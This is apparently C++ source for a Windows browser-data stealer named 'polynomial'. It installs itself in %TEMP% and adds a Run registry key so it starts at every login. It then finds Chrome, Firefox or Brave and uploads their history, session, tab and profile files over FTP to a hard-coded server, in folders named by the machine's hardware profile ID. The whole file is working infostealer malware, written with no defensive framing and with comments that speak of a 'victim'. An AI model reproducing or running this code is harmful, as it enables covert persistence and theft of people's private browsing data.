#include <stdio.h>
#include <tchar.h>
#include <windows.h>
#include <wininet.h>

#pragma comment(lib, "Version.lib")
#pragma comment(lib, "Wininet.lib")
//add feature that checks if history file is less than 5 bytes, if it is reset & look at the other browser
//uses all windows data types

int main() {
	//copies file to %TMP%\polynomial.exe & adds reg key to execute
	//polynomial.exe on each login
	const WCHAR ftpIp[] = TEXT("127.0.0.1");
	const WCHAR ftpUsername[] = TEXT("polynomial");
	const WCHAR ftpPassword[] = TEXT("polynomial");
	const WCHAR user_agent[] = L"polynomial";
	TCHAR tmp[MAX_PATH];
	GetEnvironmentVariable(L"TEMP", tmp, MAX_PATH);
	wcscat_s(tmp, _tcslen(tmp) + _tcslen(L"\\polynomial.exe") + 1, L"\\polynomial.exe");
	TCHAR ogfile[MAX_PATH];
	GetModuleFileName(NULL, ogfile, MAX_PATH);
	int cfreturn = CopyFile(ogfile, tmp, FALSE);
	if (cfreturn != 0) {
		printf("Success in copying!\n");
	}
	else {
		printf("fail\n");
	}
	LPCTSTR subkey = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	HKEY hkey = NULL;
	LPCTSTR keyname = TEXT("polynomial");
	LONG cstat = RegCreateKey(HKEY_CURRENT_USER, subkey, &hkey);
	LONG sstat = RegSetValueEx(hkey, keyname, 0, REG_SZ, (LPBYTE)tmp, _tcslen(tmp) * sizeof(TCHAR));
	//DWORD vcheck = 0;
	CHAR vbrowser[MAX_PATH];
	//char *vbrowser;
	const CHAR* browsers[] = {
		"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "C:\\Program Files\\Mozilla Firefox\\Firefox.exe", "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", 
		"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe", "C:\\Program Files (x86)\\Mozilla Firefox\\Firefox.exe", "C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" };
	//checks if victim has browser, adds browser path to vbrowser
	for (int i = 0; i <= 2; i++) {
		if (GetFileVersionInfoSizeA(browsers[i], NULL) != 0) {
			strcpy_s(vbrowser, browsers[i]);
			break;
		}
	}

	if (!strcmp(vbrowser, browsers[0]) || !strcmp(vbrowser, browsers[3])) {
		PCHAR path = new char[MAX_PATH + 1];
		size_t envPathLen = MAX_PATH;
		_dupenv_s(&path, &envPathLen, "USERPROFILE");
		CHAR bpath[MAX_PATH];
		strcpy_s(bpath, "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\");
		HW_PROFILE_INFO uvid;
		WIN32_FIND_DATA location;
		GetCurrentHwProfile(&uvid);
		strcat_s(path, strlen(path) + strlen(bpath) + 1, bpath);
		SetCurrentDirectoryA(path);
		const WCHAR* files[] = { L"History", L"Last Session", L"Last Tabs", L"Preferences" };
		HINTERNET initial = InternetOpen(user_agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
		if (initial == INVALID_HANDLE_VALUE) {
			MessageBox(NULL, L"Error", L"Error in Internet connection", 0);
		}
		HINTERNET ftp = InternetConnect(initial, ftpIp, INTERNET_DEFAULT_FTP_PORT, ftpUsername, ftpPassword, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
		if (FtpSetCurrentDirectory(ftp, uvid.szHwProfileGuid) == 0) {
			FtpCreateDirectory(ftp, uvid.szHwProfileGuid);
			FtpSetCurrentDirectory(ftp, uvid.szHwProfileGuid);
		}
		for (int i = 0; i <= 3; i++) {
			FindFirstFile(files[i], &location);
			if (!FtpPutFile(ftp, location.cFileName, location.cFileName, FTP_TRANSFER_TYPE_BINARY, 0)) {
				DWORD errorMessageID = GetLastError();
				LPSTR messageBuffer;
				size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, 
					errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

				MessageBoxA(NULL, messageBuffer, "error",  0);
			}
		}
		if (path) {
			delete[] path;
		}
	}
	else if (!strcmp(vbrowser, browsers[1]) || !strcmp(vbrowser, browsers[4])) {
		PCHAR path = new char[MAX_PATH + 1];
		size_t envPathLen = MAX_PATH;
		_dupenv_s(&path, &envPathLen, "APPDATA");
		CHAR bpath[MAX_PATH];
		strcpy_s(bpath, "\\Mozilla\\Firefox\\Profiles");
		strcat_s(path, strlen(path) + strlen(bpath) + 1, bpath);
		TCHAR currentdir[250];
		//char currentdir[250];
		//char *pathext = "\\*";
		TCHAR pathext[MAX_PATH];
		wcscpy_s(pathext, MAX_PATH, L"\\*");
		WIN32_FIND_DATA location;
		HW_PROFILE_INFO uvid;

		SetCurrentDirectoryA(path);
		GetCurrentDirectory(150, currentdir);
		wcscat_s(currentdir, MAX_PATH, pathext);
		GetCurrentHwProfile(&uvid);
		HINTERNET initial = InternetOpen(user_agent, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
		HINTERNET ftp = InternetConnect(initial, ftpIp, INTERNET_DEFAULT_FTP_PORT, ftpUsername, ftpPassword, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
		if (FtpSetCurrentDirectory(ftp, uvid.szHwProfileGuid) == 0) {
			FtpCreateDirectory(ftp, uvid.szHwProfileGuid);
			FtpSetCurrentDirectory(ftp, uvid.szHwProfileGuid);
		}
		HANDLE filefinder1 = FindFirstFile(currentdir, &location);
		if (filefinder1 != INVALID_HANDLE_VALUE) {
			//avoiding .. & .. files
			FindNextFile(filefinder1, &location);

			FindNextFile(filefinder1, &location);
			SetCurrentDirectory(location.cFileName);
			GetCurrentDirectory(150, currentdir);
			wcscat_s(currentdir, _tcslen(currentdir) + _tcslen(pathext) + 1, pathext);
			HANDLE filefinder2 = FindFirstFile(currentdir, &location);
			do {
				if (!FtpPutFile(ftp, location.cFileName, location.cFileName, FTP_TRANSFER_TYPE_BINARY, 0)) {
					DWORD errorMessageID = GetLastError();
					LPSTR messageBuffer;
					size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL,
						errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

					MessageBoxA(NULL, messageBuffer, "error", 0);
				}
			} while (FindNextFile(filefinder2, &location));
		}
		else {
			printf("Invalid file handle on FindFirstFile!\n");
		}

		if (path) {
			delete[] path;
		}

	}
	else if (!strcmp(vbrowser, browsers[2]) || !strcmp(vbrowser, browsers[5])) {
		PCHAR path = new char[MAX_PATH + 1];
		size_t envPathLen = MAX_PATH;
		_dupenv_s(&path, &envPathLen, "USERPROFILE");
		CHAR bpath[MAX_PATH];
		strcpy_s(bpath, "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default");
		strcat_s(path, strlen(path) + strlen(bpath) + 1, bpath);
		TCHAR currentdir[250];
		WCHAR pathext[] = L"\\*";
		//char currentdir[250];
		const WCHAR* folders[] = { L"Session Storage", L"AutofillStrikeDatabase", L"GPUCache" };
		//char *pathext = "\\*";
		WIN32_FIND_DATA location;
		HW_PROFILE_INFO uvid;

		SetCurrentDirectoryA(path);
		GetCurrentDirectory(150, currentdir);
		wcscat_s(currentdir, MAX_PATH, pathext);
		GetCurrentHwProfile(&uvid);
		HINTERNET initial = InternetOpen(user_agent, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
		HINTERNET ftp = InternetConnect(initial, ftpIp, INTERNET_DEFAULT_FTP_PORT, ftpUsername, ftpPassword, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
		if (FtpSetCurrentDirectory(ftp, uvid.szHwProfileGuid) == 0) {
			FtpCreateDirectory(ftp, uvid.szHwProfileGuid);
			FtpSetCurrentDirectory(ftp, uvid.szHwProfileGuid);
		}
		//char ftphomedir[100];
		CHAR ftphomedir[100];
		DWORD charcnt;
		FtpGetCurrentDirectoryA(ftp, ftphomedir, &charcnt);
		for (int i = 0; i <= 2; i++) {
			if (FtpSetCurrentDirectory(ftp, folders[i]) == 0) {
				FtpCreateDirectory(ftp, folders[i]);
			}
			else {
				FtpSetCurrentDirectoryA(ftp, ftphomedir);
			}
		}

		HANDLE filefinder1 = FindFirstFile(currentdir, &location);
		if (filefinder1 != INVALID_HANDLE_VALUE) {
			//avoiding .. & .. files
			FindNextFile(filefinder1, &location);
			FindNextFile(filefinder1, &location);
			SetCurrentDirectory(location.cFileName);
			GetCurrentDirectory(150, currentdir);
			wcscat_s(currentdir, MAX_PATH, pathext);
			HANDLE filefinder2 = FindFirstFile(currentdir, &location);
			do {
				if (!FtpPutFile(ftp, location.cFileName, location.cFileName, FTP_TRANSFER_TYPE_BINARY, 0)) {
					DWORD errorMessageID = GetLastError();
					LPSTR messageBuffer;
					size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL,
						errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);

					MessageBoxA(NULL, messageBuffer, "error", 0);
				}
			} while (FindNextFile(filefinder2, &location));
		}

	}
	else {
		MessageBox(0, L"LUCK!", L"You are luck!", MB_OK);
	}

}